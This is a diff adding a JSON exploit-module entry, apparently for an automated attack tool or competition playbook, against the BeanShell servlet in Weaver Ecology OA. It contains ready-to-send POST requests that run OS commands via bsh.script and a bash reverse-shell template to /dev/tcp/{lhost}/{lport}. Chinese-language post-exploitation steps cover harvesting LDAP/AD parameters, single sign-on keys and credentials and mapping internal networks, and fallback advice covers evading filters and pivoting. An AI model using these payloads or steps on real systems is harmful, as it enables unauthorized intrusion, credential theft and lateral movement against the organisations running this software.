@@ -1,0 +1,129 @@
+{
+  "id": "weaver-ecology-beanshell-rce",
+  "family": "oa",
+  "product": "Weaver Ecology OA",
+  "cve": "N/A",
+  "aliases": [
+    "泛微 Ecology BeanShell",
+    "Weaver BshServlet RCE"
+  ],
+  "severity": "critical",
+  "tags": [
+    "oa",
+    "weaver",
+    "ecology",
+    "beanshell",
+    "rce"
+  ],
+  "applicability": {
+    "versions": [
+      "Ecology 8.x",
+      "Ecology 9.x"
+    ],
+    "fingerprints": [
+      "Page titles, login forms, or static assets mention Ecology / 泛微",
+      "Legacy servlet paths coexist with modern SPA routes",
+      "/bsh.servlet.BshServlet is reachable"
+    ],
+    "signals": [
+      "BeanShell endpoint returns execution errors, interpreter banners, or script output",
+      "POSTed bsh.script content changes the response body",
+      "The servlet is accessible without strict admin authentication"
+    ]
+  },
+  "preconditions": [
+    "The target is a Weaver Ecology deployment exposing the BeanShell servlet.",
+    "The BeanShell endpoint is reachable directly or via an access-control bypass.",
+    "Returned output is not fully suppressed by upstream proxies or WAF rewriting."
+  ],
+  "verification": {
+    "method": "http_post",
+    "requests": [
+      {
+        "path": "/bsh.servlet.BshServlet",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "bsh.script=print(%22ecology_probe_2026%22);",
+        "matchers": [
+          "ecology_probe_2026",
+          "Response clearly differs from baseline 404 or auth-denied page"
+        ]
+      }
+    ]
+  },
+  "exploitation": {
+    "mode": "rce",
+    "requests": [
+      {
+        "path": "/bsh.servlet.BshServlet",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "bsh.script=exec(%22id%22);",
+        "os_hint": "linux"
+      },
+      {
+        "path": "/bsh.servlet.BshServlet",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "bsh.script=exec(%22whoami%22);",
+        "os_hint": "unknown"
+      }
+    ]
+  },
+  "post_exploitation": {
+    "stabilization": [
+      "先确认运行身份、应用目录、JDK 路径、数据库配置和 OA 附件目录。",
+      "优先导出流程配置、组织架构、LDAP/AD 对接参数和单点登录密钥。",
+      "如果题目是第三赛区式多层网络环境，命中后应立即梳理内网地址段、代理条件和可复用凭据。"
+    ],
+    "shell_options": [
+      {
+        "type": "bash_reverse_shell",
+        "template": "Use BeanShell to invoke /bin/sh -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
+      },
+      {
+        "type": "java_process_probe",
+        "template": "Use BeanShell to print System.getProperty(\"user.dir\") and System.getenv() before taking heavier actions"
+      }
+    ]
+  },
+  "stability": {
+    "preferred_order": [
+      "先用 print 探针验证，不要一上来就打系统命令。",
+      "确认回显稳定后再跑低噪声命令，如 whoami、hostname、pwd。",
+      "拿到执行后优先转向配置、凭据和内网代理条件，不要长时间停留在 BshServlet 上反复测试。"
+    ],
+    "safe_commands": [
+      "id",
+      "whoami",
+      "hostname",
+      "pwd",
+      "env"
+    ],
+    "shell_prerequisites": [
+      "Outbound connectivity or an internal pivot path is required for reverse shells.",
+      "The application server must allow child process execution for direct OS-command paths."
+    ],
+    "fallbacks": [
+      "If exec is filtered, use BeanShell to read Java system properties, local files, or application beans instead.",
+      "If the endpoint disappears behind an auth gate, pivot to upload, workflow, or deserialization surfaces within the same OA."
+    ]
+  },
+  "detection_notes": [
+    "Some Ecology environments expose the servlet only on specific context roots or through legacy compatibility routing.",
+    "BeanShell access can be enough for high-value credential theft even if a full reverse shell is blocked."
+  ],
+  "references": [
+    "Public Weaver Ecology BeanShell servlet exploitation analyses",
+    "Common OA competition notes for Ecology legacy servlet exposure"
+  ]
+}
